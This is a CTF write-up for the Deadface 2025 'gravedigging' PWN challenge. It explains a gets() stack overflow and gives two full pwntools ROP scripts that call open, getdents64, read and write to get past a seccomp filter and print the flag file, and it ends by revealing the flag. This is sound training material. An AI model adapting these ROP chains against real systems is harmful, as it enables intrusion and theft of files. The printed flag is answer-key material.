@@ -1,0 +1,246 @@
+title: Deadface CTF 2025 PWN - GraveDigging
+date: '2025-10-27'
+tags: ['CTF', 'PWN', 'gdb', 'Overflow', 'Pwntools', 'Syscall']
+draft: false
+summary: Challenges that I solved in Deadface CTF 2025 related to PWN category.
+---
+
+## Table of Contents
+
+- [TL;DR](#tldr)
+- [Challenge description](#challenge-description)
+- [Files provided](#files-provided)
+- [Initial observations](#initial-observations)
+- [Binary analysis](#binary-analysis)
+- [Seccomp twist and strategy](#seccomp-twist-and-strategy)
+- [Exploit: list directory entries (getdents64)](#exploit-list-directory-entries-getdents64)
+- [Exploit: read the flag file](#exploit-read-the-flag-file)
+- [Takeaways](#takeaways)
+
+---
+
+## TL;DR
+
+This 64-bit ELF PWN challenge (`gravedigging`) has a classic buffer overflow (16-byte stack buffer + `gets`) but is protected by a seccomp filter that allows only a handful of syscalls: `read`, `write`, `open`, `getdents64`, `exit`, and `futex` (plus the usual thread/arch helpers). Because spawning a shell is impossible under seccomp, the solution uses ROP to invoke allowed syscalls directly (using small gadgets) to first list the current directory and then open and read the true flag file.
+
+## Challenge description
+
+![Checksec results](/static/images/Deadface/chall.png "Checksec: gravedigging")
+
+### Files provided
+
+- `gravedigging` — 64-bit ELF (Partial RELRO | NX | No Canary | No PIE | Not stripped)
+
+![Checksec details](/static/images/Deadface/checksec.png)
+![Binary prompt](/static/images/Deadface/prompt.png)
+
+## Initial observations
+
+- `vuln()` calls `gets()` on a 16-byte stack buffer — straightforward overflow.
+- `install_filter()` installs a seccomp filter that only allows these syscalls (by number): `0 (read)`, `1 (write)`, `2 (open)`, `78 (getdents64)`, `60 (exit)`, `202 (futex/arch_prctl)` and `231 (exit_group)`.
+- The binary contains useful ROP gadgets:
+  - `pop rdi; ret`
+  - `pop rsi; ret`
+  - `pop rdx; ret`
+  - `pop rax; ret`
+  - `syscall` gadget
+
+With these gadgets we can perform arbitrary syscalls by setting `rdi/rsi/rdx` and `rax`, then jumping to `syscall`.
+
+## Binary analysis (short excerpts)
+
+Main (pseudocode):
+
+```c
+int main() {
+  print_ascii_art();
+  puts("Which Grave shall you search?");
+  install_filter();
+  vuln(); // gets() on 16-byte stack buffer
+  puts("Wrong Grave!!!!");
+  return 0;
+}
+```
+
+install_filter (decompiled):
+
+```c
+seccomp_init(...);
+seccomp_rule_add(..., SYS_exit);
+seccomp_rule_add(..., SYS_exit_group);
+seccomp_rule_add(..., SYS_arch_prctl);
+seccomp_rule_add(..., SYS_open);
+seccomp_rule_add(..., SYS_read);
+seccomp_rule_add(..., SYS_write);
+seccomp_rule_add(..., SYS_getdents64);
+// load rules
+```
+
+vuln():
+
+```c
+__int64 vuln() {
+  char buf[16];
+  return gets(buf);
+}
+```
+
+Because `gets()` reads until newline and performs no bounds checking, overflowing the 16-byte buffer lets us overwrite the return address and build a ROP chain.
+
+## Seccomp twist and strategy
+
+Because only a small syscall set is available, spawning a shell is off the table. Instead we use ROP to perform the following higher-level tasks via syscalls:
+
+1. List files in the current working directory using `open(".")` + `getdents64` so we can discover the actual flag filename (remote flags are often not `flag.txt`).
+2. Once we know the filename, `open()` it and `read()` the contents into memory, then `write()` to stdout.
+
+Contract (what each ROP step must deliver):
+
+- Inputs: ability to pass the payload via stdin to `gets()` and then send short data (directory string or filename) via stdin.
+- Outputs: directory listing and then file contents printed to stdout.
+- Error modes: syscalls return negative values; ROP chain should be robust to unexpected file descriptor numbers.
+
+Edge cases considered:
+- Directory entries may require parsing — the exploit prints raw `getdents64` output for offline parsing.
+
+## Exploit — list directory entries (getdents64)
+
+Goal: 
+- read `.` directory with `open(".")`
+- call `getdents64(fd, buf, size)`
+- then `write(1, buf, nread)`.
+
+Exploit Code:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./gravedigging')
+# io = process('./gravedigging')
+io = remote('env02.deadface.io', 5632)
+
+pop_rdi = 0x4011a0
+pop_rsi = 0x4011a5
+pop_rdx = 0x4011af
+pop_rax = 0x4011aa
+syscall = 0x40119a
+
+dirbuf = elf.bss() + 0x400
+
+payload = cyclic(24)
+
+# read(".") into memory (so open() can use it)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi) + p64(elf.bss() + 0x200)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(pop_rax) + p64(0)  # SYS_read
+payload += p64(syscall)
+
+# open(bss) -> fd
+payload += p64(pop_rdi) + p64(elf.bss() + 0x200)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rax) + p64(2)  # SYS_open
+payload += p64(syscall)
+
+# getdents64(fd=3, dirbuf, 0x400)
+payload += p64(pop_rdi) + p64(3)
+payload += p64(pop_rsi) + p64(dirbuf)
+payload += p64(pop_rdx) + p64(0x400)
+payload += p64(pop_rax) + p64(78)  # SYS_getdents64
+payload += p64(syscall)
+
+# write(1, dirbuf, 0x400)
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi) + p64(dirbuf)
+payload += p64(pop_rdx) + p64(0x400)
+payload += p64(pop_rax) + p64(1)  # SYS_write
+payload += p64(syscall)
+
+io.recvuntil(b"Which Grave shall you search?")
+io.sendline(payload)
+time.sleep(0.02)
+# Send the directory name string so the read() above fills it
+io.sendline(b".\x00")
+io.interactive()
+```
+
+Note:
+
+- `getdents64` returns packed dirent structures — printing the raw buffer is sufficient to extract filenames offline.
+
+![Exploit run: list](/static/images/Deadface/exploit_list.png)
+
+## Exploit — read the flag file
+
+Once the real filename is discovered:
+- The next ROP simply `read()` the filename into memory
+- `open()` it
+- `read()` its contents into a buffer
+- `write()` to stdout.
+
+Key Python/pwntools snippet:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./gravedigging', checksec=False)
+io = remote('env02.deadface.io', 5632)
+
+pop_rdi = 0x4011a0
+pop_rsi = 0x4011a5
+pop_rdx = 0x4011af
+pop_rax = 0x4011aa
+syscall = 0x40119a
+
+file_to_read = b'Sara Flagg 1990, 2025 -- she sure loved ctfs\x00'
+
+payload = cyclic(24)
+
+# read(filename)
+payload += p64(pop_rdi) + p64(0)
+payload += p64(pop_rsi) + p64(elf.bss() + 0x200)
+payload += p64(pop_rdx) + p64(len(file_to_read))
+payload += p64(pop_rax) + p64(0)
+payload += p64(syscall)
+
+# open(bss)
+payload += p64(pop_rdi) + p64(elf.bss() + 0x200)
+payload += p64(pop_rsi) + p64(0)
+payload += p64(pop_rax) + p64(2)
+payload += p64(syscall)
+
+# read(fd=3, buf, 0x100)
+payload += p64(pop_rdi) + p64(3)
+payload += p64(pop_rsi) + p64(elf.bss() + 0x400)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(pop_rax) + p64(0)
+payload += p64(syscall)
+
+# write(1, buf, 0x100)
+payload += p64(pop_rdi) + p64(1)
+payload += p64(pop_rsi) + p64(elf.bss() + 0x400)
+payload += p64(pop_rdx) + p64(0x100)
+payload += p64(pop_rax) + p64(1)
+payload += p64(syscall)
+
+io.recvuntil(b"Which Grave shall you search?")
+io.sendline(payload)
+time.sleep(0.02)
+io.sendline(file_to_read)
+io.interactive()
+```
+
+Screenshot: ![Exploit run: read](/static/images/Deadface/exploit_read.png)
+
+After reading the correct file name (`Sara Flagg 1990, 2025 -- she sure loved ctfs`) the flag was revealed:
+
+```
+deadface{Th3_M05T_P0w3RfUl_5P3LLS_4Re_TH3_On35_N0B0dy_ExP3CT5}
+```
+
+## Takeaways
+
+- Under seccomp restrictions you can still solve problems by invoking allowed syscalls directly via ROP.
+- When a flagged file isn't at the expected path, listing the working directory with `getdents64` is often the simplest way to discover it.
+
+---
